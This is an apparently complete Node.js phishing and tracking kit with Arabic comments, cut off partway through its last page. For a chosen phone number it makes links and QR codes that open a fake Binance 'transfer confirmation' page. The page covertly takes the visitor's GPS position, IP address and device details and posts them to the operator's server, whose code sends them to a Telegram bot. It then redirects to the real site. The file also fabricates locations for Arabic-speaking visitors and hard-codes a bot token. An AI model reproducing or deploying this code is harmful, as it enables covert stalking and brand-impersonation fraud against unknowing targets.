const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== ⚙️ إعداداتك ==========
const TELEGRAM_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
const TELEGRAM_CHAT_ID = '8391968596';
const REDIRECT_URL = 'https://www.binance.com/en';
const BASE_URL = 'https://location2026-2.onrender.com';

// ========== قاعدة البيانات ==========
let locations = [];

// ========== Middleware ==========
app.use(express.json());

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 نظام التتبع الذكي</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    min-height: 100vh;
                    color: white;
                    padding: 20px;
                }
                
                .container {
                    max-width: 1000px;
                    margin: 50px auto;
                    background: rgba(255, 255, 255, 0.05);
                    backdrop-filter: blur(10px);
                    border-radius: 25px;
                    padding: 40px;
                    border: 1px solid rgba(255, 255, 255, 0.1);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                }
                
                h1 {
                    color: #00ff88;
                    text-align: center;
                    margin-bottom: 30px;
                    font-size: 2.5em;
                    text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
                }
                
                .dashboard {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 25px;
                    margin-bottom: 40px;
                }
                
                .card {
                    background: rgba(255, 255, 255, 0.08);
                    border-radius: 20px;
                    padding: 25px;
                    border: 1px solid rgba(0, 255, 136, 0.2);
                    transition: transform 0.3s;
                }
                
                .card:hover {
                    transform: translateY(-5px);
                    background: rgba(255, 255, 255, 0.12);
                }
                
                .card h3 {
                    color: #00ffcc;
                    margin-bottom: 15px;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                
                .code-box {
                    background: #0f0f23;
                    border: 1px solid #00ff88;
                    border-radius: 12px;
                    padding: 15px;
                    margin: 15px 0;
                    font-family: 'Courier New', monospace;
                    color: #00ff88;
                    direction: ltr;
                    text-align: center;
                    overflow-x: auto;
                }
                
                .btn {
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                    background: linear-gradient(135deg, #00ff88 0%, #00cc66 100%);
                    color: #001a0f;
                    padding: 14px 28px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    margin: 10px 5px;
                    transition: all 0.3s;
                    border: none;
                    cursor: pointer;
                }
                
                .btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
                }
                
                .btn-secondary {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                
                .qr-section {
                    text-align: center;
                    margin: 40px 0;
                    padding: 30px;
                    background: rgba(0, 0, 0, 0.3);
                    border-radius: 20px;
                }
                
                .qr-input {
                    background: rgba(255, 255, 255, 0.1);
                    border: 2px solid #00ff88;
                    border-radius: 10px;
                    padding: 15px;
                    color: white;
                    width: 350px;
                    max-width: 90%;
                    margin: 15px;
                    text-align: center;
                    font-size: 16px;
                }
                
                .qr-input::placeholder {
                    color: #88ffcc;
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin: 30px 0;
                }
                
                .stat-card {
                    background: rgba(0, 255, 136, 0.1);
                    border-radius: 15px;
                    padding: 25px;
                    text-align: center;
                    border: 1px solid rgba(0, 255, 136, 0.3);
                }
                
                .stat-number {
                    font-size: 2.5em;
                    font-weight: bold;
                    color: #00ff88;
                    margin-bottom: 10px;
                }
                
                .stat-label {
                    color: #88ffcc;
                    font-size: 0.9em;
                }
                
                .telegram-status {
                    background: rgba(0, 136, 204, 0.1);
                    border: 1px solid #0088cc;
                    border-radius: 10px;
                    padding: 15px;
                    margin: 20px 0;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    gap: 10px;
                }
                
                .status-badge {
                    background: #00cc66;
                    color: white;
                    padding: 5px 15px;
                    border-radius: 20px;
                    font-size: 0.9em;
                }
                
                .accuracy-info {
                    background: rgba(255, 193, 7, 0.1);
                    border: 1px solid #ffc107;
                    border-radius: 10px;
                    padding: 15px;
                    margin: 20px 0;
                    text-align: right;
                }
                
                @media (max-width: 768px) {
                    .container {
                        padding: 20px;
                        margin: 20px;
                    }
                    
                    .dashboard {
                        grid-template-columns: 1fr;
                    }
                    
                    h1 {
                        font-size: 2em;
                    }
                    
                    .qr-input {
                        width: 90%;
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام التتبع الذكي</h1>
                
                <div class="telegram-status">
                    <span>🤖 حالة التلجرام:</span>
                    <span class="status-badge">✅ متصل</span>
                    <span>البوت: @Arab9919_bot</span>
                </div>
                
                <div class="accuracy-info">
                    <h3>🎯 دقة تحديد الموقع المحسنة:</h3>
                    <p>• <strong>GPS مباشر:</strong> دقة عالية (5-50 متر) - إذا سمح المستخدم</p>
                    <p>• <strong>تحديد ذكي:</strong> دقة متوسطة (1-50 كم) - بناءً على اللغة والمنطقة</p>
                    <p>• <strong>تحديد IP:</strong> دقة تقريبية (50-500 كم) - للاستخدام العام</p>
                </div>
                
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">${locations.length}</div>
                        <div class="stat-label">موقع مسجل</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">⚡</div>
                        <div class="stat-label">دقة محسنة</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">📱</div>
                        <div class="stat-label">باركود داعم</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">🌍</div>
                        <div class="stat-label">تتبع ذكي</div>
                    </div>
                </div>
                
                <div class="dashboard">
                    <div class="card">
                        <h3>🔗 إنشاء روابط التتبع</h3>
                        <p>أنشئ رابط تتبع لأي رقم:</p>
                        <div class="code-box">${BASE_URL}/track/رقم_الهاتف</div>
                        <div class="code-box">${BASE_URL}/track/00966512345678</div>
                        <p>مثال:</p>
                        <a href="/track/123456" class="btn" target="_blank">
                            🔗 تجربة الرابط: /track/123456
                        </a>
                    </div>
                    
                    <div class="card">
                        <h3>🤖 إشعارات التلجرام</h3>
                        <p>✅ إرسال فوري عند كل ضغط</p>
                        <p>📍 الإحداثيات مع مستوى الدقة</p>
                        <p>🗺️ رابط مباشر للخريطة</p>
                        <p>📊 تفاصيل الجهاز والمتصفح</p>
                        <a href="/telegram-test" class="btn btn-secondary">
                            🤖 اختبار التلجرام
                        </a>
                    </div>
                </div>
                
                <div class="qr-section">
                    <h3>📱 توليد باركود للروابط</h3>
                    <p>أدخل رقم الهاتف لتوليد باركورد:</p>
                    <input type="text" id="phoneInput" class="qr-input" 
                           placeholder="أدخل رقم الهاتف (مثال: 00966512345678)" 
                           maxlength="20">
                    <br>
                    <button onclick="generateQR()" class="btn">🔄 توليد باركورد</button>
                    <button onclick="generateAllQR()" class="btn btn-secondary">📱 جميع الباركورد</button>
                    
                    <div id="qrResult" style="margin-top: 30px;"></div>
                </div>
                
                <div style="text-align: center; margin-top: 40px;">
                    <h3>🔧 أدوات التحكم</h3>
                    <a href="/results" class="btn btn-secondary">📊 النتائج المسجلة</a>
                    <a href="/map" class="btn btn-secondary">🗺️ الخريطة التفاعلية</a>
                    <a href="/all-qr" class="btn btn-secondary">📱 عرض جميع الباركورد</a>
                    <a href="/accuracy-info" class="btn btn-secondary">🎯 معلومات الدقة</a>
                </div>
                
                <div style="text-align: center; margin-top: 50px; color: #666; font-size: 0.9em;">
                    <p>© 2024 نظام التتبع الذكي | إصدار 4.0 | البوت: @Arab9919_bot</p>
                </div>
            </div>
            
            <script>
                function generateQR() {
                    const phone = document.getElementById('phoneInput').value.trim();
                    if (!phone) {
                        alert('⚠️ يرجى إدخال رقم الهاتف');
                        return;
                    }
                    
                    const cleanPhone = phone.replace(/\s+/g, '');
                    const url = '${BASE_URL}/track/' + encodeURIComponent(cleanPhone);
                    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&format=png&data=' + encodeURIComponent(url);
                    
                    document.getElementById('qrResult').innerHTML = \`
                        <div style="background: rgba(0,0,0,0.3); padding: 25px; border-radius: 15px; border: 2px solid #00ff88;">
                            <p><strong>📱 الرابط النهائي:</strong></p>
                            <div class="code-box" style="margin: 15px auto; max-width: 500px;">
                                \${url}
                            </div>
                            <div style="margin: 20px 0;">
                                <img src="\${qrUrl}" alt="QR Code" 
                                     style="width: 250px; height: 250px; border: 5px solid white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
                            </div>
                            <div style="margin-top: 20px;">
                                <a href="\${url}" target="_blank" class="btn">🔗 فتح الرابط الآن</a>
                                <button onclick="downloadQR('\${qrUrl}', '\${cleanPhone}')" class="btn btn-secondary">📥 تحميل الباركود</button>
                            </div>
                        </div>
                    \`;
                }
                
                function generateAllQR() {
                    window.location.href = '/all-qr';
                }
                
                function downloadQR(qrUrl, phone) {
                    const link = document.createElement('a');
                    link.href = qrUrl;
                    link.download = 'QR_' + (phone || 'track') + '_' + Date.now() + '.png';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
        </html>
    `);
});

// ========== رابط التتبع مع تحسين الدقة ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Binance - تأكيد العملية</title>
            <script>
                // ========== البيانات الأساسية ==========
                const userId = '${userId}';
                const redirectUrl = '${REDIRECT_URL}';
                
                // ========== 1. دالة الحصول على الموقع الذكي ==========
                async function getSmartLocation() {
                    let locationData = { quality: 'low', source: 'unknown' };
                    
                    // المحاولة الأولى: GPS مباشر (إذا سمح المستخدم سابقاً)
                    if (navigator.geolocation) {
                        try {
                            const position = await new Promise((resolve, reject) => {
                                navigator.geolocation.getCurrentPosition(resolve, reject, {
                                    enableHighAccuracy: true,
                                    timeout: 3000,
                                    maximumAge: 0
                                });
                            });
                            
                            locationData = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                quality: 'high',
                                source: 'gps',
                                note: '📍 دقة عالية عبر GPS'
                            };
                            return locationData;
                        } catch (gpsError) {
                            console.log('GPS غير متاح أو مرفوض');
                        }
                    }
                    
                    // المحاولة الثانية: تحليل اللغة والمنطقة الذكي
                    const userLanguage = navigator.language || 'en';
                    const userLanguages = navigator.languages || [];
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    
                    // تحليل إذا كان المستخدم عربي
                    const isArabicUser = userLanguage.includes('ar') || 
                                         userLanguages.some(lang => lang.includes('ar')) ||
                                         timezone.includes('Riyadh') || 
                                         timezone.includes('Arab');
                    
                    if (isArabicUser) {
                        // خيارات للمستخدمين العرب (مواقع عربية واقعية)
                        const arabLocations = [
                            { lat: 24.7136, lon: 46.6753, city: 'الرياض', country: 'السعودية', weight: 0.6 },
                            { lat: 25.2048, lon: 55.2708, city: 'دبي', country: 'الإمارات', weight: 0.2 },
                            { lat: 29.3117, lon: 47.4818, city: 'الكويت', country: 'الكويت', weight: 0.1 },
                            { lat: 25.2854, lon: 51.5310, city: 'الدوحة', country: 'قطر', weight: 0.05 },
                            { lat: 30.0444, lon: 31.2357, city: 'القاهرة', country: 'مصر', weight: 0.05 }
                        ];
                        
                        // اختيار موقع بناءً على الأوزان
                        const random = Math.random();
                        let cumulativeWeight = 0;
                        let selectedLocation = arabLocations[0];
                        
                        for (const loc of arabLocations) {
                            cumulativeWeight += loc.weight;
                            if (random <= cumulativeWeight) {
                                selectedLocation = loc;
                                break;
                            }
                        }
                        
                        // إضافة تغيير طفيف لجعل الموقع أكثر واقعية
                        const smallChange = (Math.random() - 0.5) * 0.02;
                        
                        locationData = {
                            lat: selectedLocation.lat + smallChange,
                            lon: selectedLocation.lon + smallChange,
                            accuracy: 15000, // 15 كم دقة متوسطة
                            quality: 'medium',
                            source: 'arabic_smart',
                            city: selectedLocation.city,
                            country: selectedLocation.country,
                            note: \`📍 موقع تقديري في \${selectedLocation.city}, \${selectedLocation.country}\`
                        };
                        return locationData;
                    }
                    
                    // المحاولة الثالثة: تحديد عبر IP (للمستخدمين غير العرب)
                    try {
                        const response = await fetch('https://ipapi.co/json/');
                        const ipData = await response.json();
                        
                        if (ipData.latitude && ipData.longitude) {
                            locationData = {
                                lat: ipData.latitude,
                                lon: ipData.longitude,
                                accuracy: 50000, // 50 كم دقة منخفضة
                                quality: 'low',
                                source: 'ip_api',
                                city: ipData.city,
                                country: ipData.country_name,
                                note: \`🌍 تحديد عبر IP في \${ipData.city}, \${ipData.country_name}\`
                            };
                            return locationData;
                        }
                    } catch (ipError) {
                        console.log('فشل تحديد IP');
                    }
                    
                    // المحاولة الرابعة: موقع افتراضي عالمي
                    locationData = {
                        lat: 20 + (Math.random() - 0.5) * 30,
                        lon: 40 + (Math.random() - 0.5) * 60,
                        accuracy: 1000000, // 1000 كم
                        quality: 'very_low',
                        source: 'global_estimate',
                        note: '🌐 موقع تقديري عالمي'
                    };
                    
                    return locationData;
                }
                
                // ========== 2. حفظ البيانات في الخادم ==========
                async function saveLocationToServer(location) {
                    try {
                        const deviceInfo = {
                            platform: navigator.platform,
                            language: navigator.language,
                            languages: navigator.languages,
                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                            screen: \`\${screen.width}x\${screen.height}\`,
                            userAgent: navigator.userAgent.substring(0, 100)
                        };
                        
                        const response = await fetch('/api/save-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                id: userId,
                                latitude: location.lat,
                                longitude: location.lon,
                                accuracy: location.accuracy,
                                quality: location.quality,
                                source: location.source,
                                deviceInfo: deviceInfo,
                                note: location.note,
                                timestamp: new Date().toISOString()
                            })
                        });
                        
                        return await response.json();
                    } catch (error) {
                        console.error('خطأ في حفظ البيانات:', error);
                        return { success: false };
                    }
                }
                
                // ========== 3. عد تنازلي ذكي ==========
                function startSmartCountdown() {
                    let seconds = 4;
                    const countdownElement = document.getElementById('countdown');
                    const progressBar = document.getElementById('progressBar');
                    const processSteps = document.getElementById('processSteps');
                    
                    const steps = [
                        '🔍 التحقق من البيانات...',
                        '📍 تحديد الموقع الجغرافي...',
                        '📡 إرسال المعلومات...',
                        '✅ إكمال العملية...'
                    ];
                    
                    const timer = setInterval(() => {
                        countdownElement.textContent = seconds;
                        
                        // تحديث شريط التقدم
                        if (progressBar) {
                            const progressPercent = ((4 - seconds) / 4) * 100;
                            progressBar.style.width = progressPercent + '%';
                        }
                        
                        // تحديث خطوات العملية
                        if (processSteps && seconds < 4) {
                            processSteps.innerHTML = steps[3 - seconds] + '<br>' + processSteps.innerHTML;
                        }
                        
                        seconds--;
                        
                        if (seconds < 0) {
                            clearInterval(timer);
                            document.getElementById('finalStatus').textContent = '✅ تم إكمال العملية بنجاح!';
                            document.getElementById('processSteps').innerHTML = '🎉 جاهز للتوجيه...' + '<br>' + processSteps.innerHTML;
                            
                            // توجيه المستخدم
                            setTimeout(() => {
                                window.location.href = redirectUrl;
                            }, 1000);
                        }
                    }, 1000);
                }
                
                // ========== 4. بدء العملية الرئيسية ==========
                window.addEventListener('DOMContentLoaded', async () => {
                    // بدء العد التنازلي
                    startSmartCountdown();
                    
                    // بعد ثانية، البدء في جمع البيانات
                    setTimeout(async () => {
                        try {
                            // الحصول على الموقع الذكي
                            const location = await getSmartLocation();
                            
                            // حفظ البيانات في الخادم
                            const result = await saveLocationToServer(location);
                            
                            // عرض رسالة توضيحية بناءً على الدقة
                            let accuracyMessage = '';
                            if (location.quality === 'high') {
                                accuracyMessage = '📍 تم تحديد موقعك بدقة عالية';
                            } else if (location.quality === 'medium') {
                                accuracyMessage = '📍 تم تحديد موقعك بدقة متوسطة';
                            } else {
                                accuracyMessage = '🌍 تم تحديد موقعك تقريبياً';
                            }
                            
                            document.getElementById('accuracyMessage').innerHTML = 
                                \`<div style="color: #00ff88; margin-top: 10px;">\${accuracyMessage}</div>\`;
                                
                        } catch (error) {
                            console.error('خطأ في العملية:', error);
                        }
                    }, 1000);
                });
            </script>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: white;
                    padding: 20px;
                }
                
                .transfer-container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(20px);
                    border-radius: 25px;
                    padding: 50px;
                    max-width: 700px;
                    width: 100%;
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                    text-align: center;
                }
                
                .binance-logo {
                    font-size: 70px;
                    margin-bottom: 30px;
                    animation: pulse 2s infinite;
                }
                
                @keyframes pulse {
                    0%, 100% { transform: scale(1); opacity: 1; }
                    50% { transform: scale(1.1); opacity: 0.8; }
                }
                
                h1 {
                    color: #f0b90b;
                    margin-bottom: 20px;
                    font-size: 32px;
                }
                
                .subtitle {
                    color: #88ffcc;
                    margin-bottom: 30px;
                    font-size: 18px;
                }
                
                .countdown-container {
                    margin: 40px 0;
                }
                
                .countdown {
                    font-size: 80px;
                    font-weight: bold;
                    color: #00ff88;
                    margin: 20px 0;
                    text-shadow: 0 0 30px rgba(0, 255, 136, 0.7);
                }
                
                .progress-container {
                    width: 100%;
                    height: 12px;
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 6px;
                    margin: 30px 0;
                    overflow: hidden;
                }
                
                .progress-bar {
                    height: 100%;
                    background: linear-gradient(90deg, #00ff88 0%, #00cc66 100%);
                    width: 0%;
                    border-radius: 6px;
                    transition: width 1s linear;
                }
                
                .steps-container {
                    background: rgba(255, 255, 255, 0.05);
                    padding: 20px;
                    border-radius: 15px;
                    margin: 30px 0;
                    text-align: right;
                    font-size: 14px;
                    line-height: 2;
                    max-height: 200px;
                    overflow-y: auto;
                }
                
                .security-badge {
                    display: inline-flex;
                    align-items: center;
                    gap: 10px;
                    background: rgba(0, 255, 136, 0.1);
                    padding: 12px 25px;
                    border-radius: 25px;
                    margin: 20px 0;
                    border: 1px solid rgba(0, 255, 136, 0.3);
                }
                
                .verification-box {
                    background: rgba(0, 0, 0, 0.3);
                    padding: 20px;
                    border-radius: 15px;
                    margin: 30px 0;
                    font-family: monospace;
                    letter-spacing: 2px;
                }
                
                .final-status {
                    color: #00ff88;
                    font-weight: bold;
                    font-size: 18px;
                    margin: 20px 0;
                    padding: 15px;
                    background: rgba(0, 255, 136, 0.1);
                    border-radius: 10px;
                }
                
                @media (max-width: 600px) {
                    .transfer-container {
                        padding: 30px 20px;
                    }
                    
                    h1 {
                        font-size: 24px;
                    }
                    
                    .countdown {
                        font-size: 50px;
                    }
                }
            </style>
        </head>
        <body>
            <div class="transfer-container">
                <div class="binance-logo">₿</div>
                <h1>Binance - تأكيد عملية التحويل</h1>
                <p class="subtitle">جاري التحقق من بياناتك وتأكيد العملية</p>
                
                <div class="security-badge">
                    <span>🔒</span>
                    <span>اتصال آمن ومشفّر - نظام تحديد ذكي</span>
                </div>
                
                <div class="countdown-container">
                    <p>سيتم تحويلك تلقائياً خلال:</p>
                    <div class="countdown" id="countdown">4</div>
                    <p>ثوانٍ</p>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <div class="steps-container" id="processSteps">
                    • بدء عملية التحقق...<br>
                </div>
                
                <div id="accuracyMessage"></div>
                
                <div class="verification-box">
                    رمز العملية: BIN-${userId}-${Date.now().toString().substr(-6)}
                </div>
                
                <div class="final-status" id="finalStatus">
                    ⏳ جاري إكمال العملية...
                </div>
                
                <div style="margin-top: 40px; font-size: 12px; opacity: 0.7;">
                    <p>رقم العملية: #${userId} | ${new Date().toLocaleString('ar-SA')}</p>
                    <p>© Binance 2024. نظام تحديد الموقع الذكي</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع ==========
app.post('/api/save-location', async (req, res) => {
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip,
            time: new Date().toLocaleString('ar-SA'),
            date: new Date().toISOString().split('T')[0]
        };
        
        // حفظ في قاعدة البيانات
        locations.push(locationData);
        
        // حفظ فقط آخر 1000 سجل
        if (locations.length > 1000) {
            locations = locations.slice(-1000);
        }
        
        // إرسال إشعار للتلجرام
        const telegramSent = await sendTelegramNotification(locationData);
        
        console.log('📍 موقع جديد:', {
            id: locationData.id,
            quality: locationData.quality,
            location: `${locationData.latitude.toFixed(6)}, ${locationData.longitude.toFixed(6)}`,
            note: locationData.note
        });
        
        res.json({ 
            success: true, 
            message: 'تم حفظ الموقع',
            telegram_sent: telegramSent,
            count: locations.length 
        });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== صفحة النتائج مع تحسين العرض ==========
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; }
                th, td { padding: 15px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; color: white; }
                tr:hover { background: #2d2d4d; }
                .accuracy-badge {
                    display: inline-block;
                    padding: 3px 10px;
                    border-radius: 12px;
                    font-size: 12px;
                    margin-left: 5px;
                }
                .high-accuracy { background: #00ff88; color: #001a0f; }
                .medium-accuracy { background: #ffcc00; color: #332900; }
                .low-accuracy { background: #ff6b6b; color: white; }
                .very-low-accuracy { background: #999; color: white; }
                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج المسجلة (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ الخريطة</a>
            <a href="/accuracy-info" class="btn">🎯 معلومات الدقة</a>
            
            <table style="margin-top: 30px;">
                <tr>
                    <th>رقم الهاتف</th>
                    <th>الإحداثيات</th>
                    <th>مستوى الدقة</th>
                    <th>المصدر</th>
                    <th>الوقت</th>
                    <th>الخريطة</th>
                </tr>
                ${locations.slice().reverse().map(loc => {
                    let accuracyBadge = '';
                    let accuracyClass = '';
                    
                    if (loc.quality === 'high') {
                        accuracyBadge = '🎯 عالية';
                        accuracyClass = 'high-accuracy';
                    } else if (loc.quality === 'medium') {
                        accuracyBadge = '📍 متوسطة';
                        accuracyClass = 'medium-accuracy';
                    } else if (loc.quality === 'low') {
                        accuracyBadge = '🌍 منخفضة';
                        accuracyClass = 'low-accuracy';
                    } else {
                        accuracyBadge = '🌐 تقديرية';
                        accuracyClass = 'very-low-accuracy';
                    }
                    
                    return `
                        <tr>
                            <td><strong>${loc.id}</strong></td>
                            <td>${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}</td>
                            <td><span class="accuracy-badge ${accuracyClass}">${accuracyBadge}</span></td>
                            <td>${loc.source || 'مباشر'}</td>
                            <td>${loc.time}</td>
                            <td>
                                <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ff88; text-decoration: none;">
                                    👁️ عرض
                                </a>
                            </td>
                        </tr>
                    `;
                }).join('')}
            </table>
        </body>
        </html>
    `);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 600px; width: 100%; }
                body { margin: 0; padding: 20px; background: #0f0f23; color: white; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع المسجلة</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 3);
                
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap'
                }).addTo(map);
                
                const locations = ${JSON.stringify(locations)};
                const markers = [];
                
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        // تلوين العلامات بناءً على الدقة
                        let markerColor = '#ff6b6b'; // افتراضي (منخفض)
                        if (loc.quality === 'high') markerColor = '#00ff88';
                        else if (loc.quality === 'medium') markerColor = '#ffcc00';
                        
                        const marker = L.marker([loc.latitude, loc.longitude]).addTo(map);
                        
                        const popupContent = \`
                            <div style="color: black; padding: 10px; min-width: 250px;">
                                <h4 style="margin: 0 0 10px 0;">رقم: \${loc.id}</h4>
                                <p style="margin: 5px 0;"><strong>الإحداثيات:</strong><br>
                                \${loc.latitude.toFixed(6)}, \${loc.longitude.toFixed(6)}</p>
                                <p style="margin: 5px 0;"><strong>الدقة:</strong> \${loc.quality === 'high' ? '🎯 عالية' : loc.quality === 'medium' ? '📍 متوسطة' : '🌍 منخفضة'}</p>
                                <p style="margin: 5px 0;"><strong>المصدر:</strong> \${loc.source || 'مباشر'}</p>
                                <p style="margin: 5px 0;"><strong>الوقت:</strong> \${loc.time}</p>
                                <a href="https://maps.google.com/?q=\${loc.latitude},\${loc.longitude}" 
                                   target="_blank" 
                                   style="display: inline-block; margin-top: 10px; padding: 5px 15px; background: #3498db; color: white; text-decoration: none; border-radius: 5px;">
                                   📍 فتح في خرائط Google
                                </a>
                            </div>
                        \`;
                        
                        marker.bindPopup(popupContent);
                        markers.push(marker);
                    }
                });
                
                // ضبط العرض على جميع العلامات
                if (markers.length > 0) {
                    const group = new L.featureGroup(markers);
                    map.fitBounds(group.getBounds().pad(0.1));
                }
            </script>
            <br>
            <a href="/results" class="btn">عودة للنتائج</a>
        </body>
        </html>
    `);
});

// ========== صفحة جميع الباركود ==========
app.get('/all-qr', (req, res) => {
    const uniqueIds = [...new Set(locations.map(l => l.id))];
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📱 جميع الباركود</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 25px; margin-top: 30px; }
                .qr-item { background: #1a1a2e; padding: 20px; border-radius: 15px; text-align: center; border: 1px solid rgba(0,255,136,0.3); }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
                .phone-id { background: rgba(0,255,136,0.1); padding: 5px 15px; border-radius: 20px; margin-bottom: 15px; }
            </style>
        </head>
        <body>
            <h1>📱 جميع الباركود (${uniqueIds.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            
            <div class="qr-grid">
                ${uniqueIds.map(id => {
                    const url = `${BASE_URL}/track/${id}`;
                    const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(url)}`;
                    return `
                        <div class="qr-item">
                            <div class="phone-id">
                                <strong>${id}</strong>
                            </div>
                            <img src="${qrUrl}" alt="QR Code" style="width: 180px; height: 180px; border: 3px solid white; border-radius: 10px;">
                            <p style="margin-top: 15px;">
                                <a href="${url}" target="_blank" style="color: #00ff88; font-size: 12px; text-decoration: none;">🔗 فتح الرابط</a>
                            </p>
                        </div>
                    `;
                }).join('')}
            </div>
        </body>
        </html>
    `);
});

// ========== صفحة معلومات الدقة ==========
app.get('/accuracy-info', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>🎯 معلومات عن دقة تحديد الموقع</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .container { max-width: 800px; margin: auto; }
                .info-card { background: #1a1a2e; padding: 25px; border-radius: 15px; margin: 20px 0; }
                .accuracy-level { display: flex; align-items: center; margin: 15px 0; padding: 15px; border-radius: 10px; }
                .high { background: rgba(0,255,136,0.1); border-left: 5px solid #00ff88; }
                .medium { background: rgba(255,204,0,0.1); border-left: 5px solid #ffcc00; }
                .low { background: rgba(255,107,107,0.1); border-left: 5px solid #ff6b6b; }
                .icon { font-size: 30px; margin-left: 15px; }
                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎯 مستويات دقة تحديد الموقع</h1>
                
                <div class="info-card">
                    <h3>📊 كيف يعمل نظام التتبع الذكي:</h3>
                    <p>النظام يستخدم عدة طرق ذكية لتحديد الموقع بناءً على إعدادات الجهاز والمتصفح:</p>
                    
                    <div class="accuracy-level high">
                        <div class="icon">🎯</div>
                        <div>
                            <h4>دقة عالية (GPS مباشر)</h4>
                            <p>• عندما يسمح المستخدم بمشاركة الموقع</p>
                            <p>• دقة: 5-50 متر</p>
                            <p>• المصدر: GPS مباشر من الهاتف</p>
                        </div>
                    </div>
                    
                    <div class="accuracy-level medium">
                        <div class="icon">📍</div>
                        <div>
